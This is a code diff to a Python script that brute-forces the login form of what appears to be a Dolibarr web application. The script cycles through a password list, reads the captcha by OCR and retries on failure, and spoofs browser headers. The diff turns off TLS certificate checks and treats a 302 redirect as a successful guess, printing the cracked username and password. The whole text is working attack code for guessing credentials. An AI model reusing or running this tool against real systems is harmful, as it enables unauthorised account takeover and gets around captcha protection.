@@ -41,7 +41,7 @@ def get_captcha_code(base_url):
 
 
 def auth (base_url, username, passwords):
-    login_url = base_url + "admin/index.php?mainmenu=home"
+    login_url = base_url + "index.php?mainmenu=home"
     for password in passwords:
         a = 1
         while(a==1):
@@ -62,13 +62,13 @@ def auth (base_url, username, passwords):
             headers["Content-Type"] = "application/x-www-form-urlencoded"
             headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36"
             headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
-            headers["Referer"] = f"{base_url}admin/index.php?mainmenu=home"
+            headers["Referer"] = f"{base_url}index.php?mainmenu=home"
             headers["Accept-Language"] = "en-US,en;q=0.9,ar;q=0.8,fr;q=0.7"
 
             # you can use json object or f string format
             data = "token=" + str(urllib.parse.quote(token,safe='')) + "&actionlogin=login&loginfunction=loginfunction&tz=1&tz_string=Africa%2FCasablanca&dst_observed=0&dst_first=2022-05-8T01%3A59%3A00Z&dst_second=2022-03-27T02%3A59%3A00Z&screenwidth=1038&screenheight=718&dol_hide_topmenu=&dol_hide_leftmenu=&dol_optimize_smallscreen=&dol_no_mouse_hover=&dol_use_jmobile=&username=" + str(username) + "&password=" + str(password[:-1]) + "&code=" + str(captcha)
 
-            resp = session.post(login_url, headers=headers, data=data, cookies=cookies, allow_redirects=False) # stop redirect to catch 302 (didn't work
+            resp = session.post(login_url, headers=headers, data=data, cookies=cookies, allow_redirects=False, verify=False)
 
             login = BeautifulSoup(resp.text,"lxml")
 
@@ -83,9 +83,9 @@ def auth (base_url, username, passwords):
                     if (error_message.text.strip() == "Bad value for security code. Try again with new value..."):
                         print(f"[!] [{resp.status_code}] Wrong captcha ocr. Retrying...")
                         
-            # simple test case. It's better to do it with 302 status code.        
-            else:
-                print(f"[*] Done! {username}:{password[:-1]} ")
+                   
+            if resp.status_code == 302 :
+                print(f"[*] [{resp.status_code}] Done! {username}:{password[:-1]} Redirect to : {resp.headers['Location']}")
                 sys.exit()
 
 def main():
